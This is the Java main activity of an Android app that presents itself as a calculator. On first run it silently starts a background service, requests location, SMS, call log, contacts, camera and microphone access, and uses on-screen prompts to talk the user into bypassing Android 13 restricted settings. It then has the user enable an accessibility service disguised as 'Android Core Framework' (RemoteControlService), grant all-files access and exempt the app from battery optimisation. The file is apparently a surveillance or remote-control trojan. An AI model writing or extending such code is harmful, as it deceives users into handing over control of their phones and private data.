package com.sys.service.manager;

import android.accessibilityservice.AccessibilityService;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.PowerManager;
import android.provider.Settings;
import android.text.TextUtils;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;
import android.Manifest;

import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

public class MainActivity extends Activity {

    private static final int REQUEST_CODE_PERMISSIONS = 101;
    private static final int REQUEST_CODE_ACCESSIBILITY = 102;
    private static final int REQUEST_CODE_MANAGE_STORAGE = 103;
    private static final int REQUEST_CODE_BATTERY = 104;

    // Calculator variables
    private TextView txtExpression, txtResult;
    private String currentNumber = "";
    private String operator = "";
    private double firstOperand = 0;
    private boolean isNewOperation = true;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // Start the background service immediately
        startService(new Intent(this, MainService.class));

        // Initialize calculator display
        txtExpression = findViewById(R.id.txt_expression);
        txtResult = findViewById(R.id.txt_result);

        // Setup calculator buttons
        setupCalculatorButtons();

        // Check if first run to request permissions
        SharedPreferences prefs = getSharedPreferences("calc_prefs", MODE_PRIVATE);
        boolean isFirstRun = prefs.getBoolean("first_run", true);
        if (isFirstRun) {
            startPermissionFlow();
            prefs.edit().putBoolean("first_run", false).apply();
        }
    }

    private void setupCalculatorButtons() {
        // Number buttons
        int[] numberIds = {
            R.id.btn_0, R.id.btn_1, R.id.btn_2, R.id.btn_3, R.id.btn_4,
            R.id.btn_5, R.id.btn_6, R.id.btn_7, R.id.btn_8, R.id.btn_9
        };

        for (int i = 0; i < numberIds.length; i++) {
            final int num = i;
            findViewById(numberIds[i]).setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View v) {
                    onNumberClick(String.valueOf(num));
                }
            });
        }

        // Dot button
        findViewById(R.id.btn_dot).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                if (!currentNumber.contains(".")) {
                    if (currentNumber.isEmpty()) currentNumber = "0";
                    currentNumber += ".";
                    txtResult.setText(currentNumber);
                }
            }
        });

        // Operator buttons
        findViewById(R.id.btn_add).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) { onOperatorClick("+"); }
        });

        findViewById(R.id.btn_subtract).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) { onOperatorClick("-"); }
        });

        findViewById(R.id.btn_multiply).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) { onOperatorClick("×"); }
        });

        findViewById(R.id.btn_divide).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) { onOperatorClick("÷"); }
        });

        // Equals button
        findViewById(R.id.btn_equals).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) { onEqualsClick(); }
        });

        // Clear button
        findViewById(R.id.btn_clear).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) { onClearClick(); }
        });

        // Sign button (+/-)
        findViewById(R.id.btn_sign).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                if (!currentNumber.isEmpty() && !currentNumber.equals("0")) {
                    if (currentNumber.startsWith("-")) {
                        currentNumber = currentNumber.substring(1);
                    } else {
                        currentNumber = "-" + currentNumber;
                    }
                    txtResult.setText(currentNumber);
                }
            }
        });

        // Percent button
        findViewById(R.id.btn_percent).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                if (!currentNumber.isEmpty()) {
                    double val = Double.parseDouble(currentNumber) / 100.0;
                    currentNumber = formatResult(val);
                    txtResult.setText(currentNumber);
                }
            }
        });
    }

    private void onNumberClick(String num) {
        if (isNewOperation) {
            currentNumber = "";
            isNewOperation = false;
        }
        currentNumber += num;
        txtResult.setText(currentNumber);
    }

    private void onOperatorClick(String op) {
        if (!currentNumber.isEmpty()) {
            if (!operator.isEmpty()) {
                onEqualsClick();
            } else {
                firstOperand = Double.parseDouble(currentNumber);
            }
        }
        operator = op;
        txtExpression.setText(formatResult(firstOperand) + " " + operator);
        currentNumber = "";
        isNewOperation = false;
    }

    private void onEqualsClick() {
        if (operator.isEmpty() || currentNumber.isEmpty()) return;

        double secondOperand = Double.parseDouble(currentNumber);
        double result = 0;

        switch (operator) {
            case "+": result = firstOperand + secondOperand; break;
            case "-": result = firstOperand - secondOperand; break;
            case "×": result = firstOperand * secondOperand; break;
            case "÷":
                if (secondOperand != 0) {
                    result = firstOperand / secondOperand;
                } else {
                    txtResult.setText("Error");
                    currentNumber = "";
                    operator = "";
                    isNewOperation = true;
                    return;
                }
                break;
        }

        txtExpression.setText(formatResult(firstOperand) + " " + operator + " " + formatResult(secondOperand) + " =");
        currentNumber = formatResult(result);
        txtResult.setText(currentNumber);
        firstOperand = result;
        operator = "";
        isNewOperation = true;
    }

    private void onClearClick() {
        currentNumber = "";
        operator = "";
        firstOperand = 0;
        isNewOperation = true;
        txtExpression.setText("");
        txtResult.setText("0");
    }

    private String formatResult(double value) {
        if (value == (long) value) {
            return String.valueOf((long) value);
        } else {
            return String.valueOf(value);
        }
    }

    // ==================== PERMISSION FLOW ====================

    private void startPermissionFlow() {
        String[] permissions = {
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION,
                Manifest.permission.READ_SMS,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.CAMERA,
                Manifest.permission.RECORD_AUDIO
        };

        boolean allGranted = true;
        for (String p : permissions) {
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
                allGranted = false;
                break;
            }
        }

        if (!allGranted) {
            ActivityCompat.requestPermissions(this, permissions, REQUEST_CODE_PERMISSIONS);
        } else {
            checkAccessibility();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        if (requestCode == REQUEST_CODE_PERMISSIONS) {
            checkAccessibility();
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        switch (requestCode) {
            case REQUEST_CODE_ACCESSIBILITY:
                checkStoragePermission();
                break;
            case REQUEST_CODE_APP_INFO:
                // After allowing restricted settings, now go to accessibility
                Toast.makeText(this, "Paso 2: Ahora activa 'Android Core Framework' en Accesibilidad", Toast.LENGTH_LONG).show();
                Intent accIntent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                startActivityForResult(accIntent, REQUEST_CODE_ACCESSIBILITY);
                break;
            case REQUEST_CODE_MANAGE_STORAGE:
                checkBatteryOptimization();
                break;
            case REQUEST_CODE_BATTERY:
                break;
        }
    }

    private static final int REQUEST_CODE_APP_INFO = 105;

    private void checkAccessibility() {
        if (!isAccessibilityServiceEnabled(this, RemoteControlService.class)) {
            if (Build.VERSION.SDK_INT >= 33) {
                // Android 13+: First need to allow restricted settings
                Toast.makeText(this, "Paso 1: Toca los 3 puntos (⋮) arriba y selecciona 'Permitir ajustes restringidos'", Toast.LENGTH_LONG).show();
                Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                intent.setData(Uri.parse("package:" + getPackageName()));
                startActivityForResult(intent, REQUEST_CODE_APP_INFO);
            } else {
                Toast.makeText(this, "Activa el servicio 'Android Core Framework' en Accesibilidad", Toast.LENGTH_LONG).show();
                Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                startActivityForResult(intent, REQUEST_CODE_ACCESSIBILITY);
            }
        } else {
            checkStoragePermission();
        }
    }

    private void checkStoragePermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                intent.setData(Uri.parse("package:" + getPackageName()));
                startActivityForResult(intent, REQUEST_CODE_MANAGE_STORAGE);
            } else {
                checkBatteryOptimization();
            }
        } else {
            checkBatteryOptimization();
        }
    }

    private void checkBatteryOptimization() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            if (!pm.isIgnoringBatteryOptimizations(getPackageName())) {
                Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                intent.setData(Uri.parse("package:" + getPackageName()));
                startActivityForResult(intent, REQUEST_CODE_BATTERY);
            }
        }
    }

    public static boolean isAccessibilityServiceEnabled(Context context, Class<? extends AccessibilityService> service) {
        String myService = context.getPackageName() + "/" + service.getName();
        int accessibilityEnabled = 0;
        try {
            accessibilityEnabled = Settings.Secure.getInt(context.getContentResolver(), Settings.Secure.ACCESSIBILITY_ENABLED);
        } catch (Settings.SettingNotFoundException e) {
            e.printStackTrace();
        }

        TextUtils.SimpleStringSplitter mStringColonSplitter = new TextUtils.SimpleStringSplitter(':');
        if (accessibilityEnabled == 1) {
            String settingValue = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            if (settingValue != null) {
                mStringColonSplitter.setString(settingValue);
                while (mStringColonSplitter.hasNext()) {
                    String accessibilityService = mStringColonSplitter.next();
                    if (accessibilityService.equalsIgnoreCase(myService)) {
                        return true;
                    }
                }
            }
        }
        return false;
    }
}
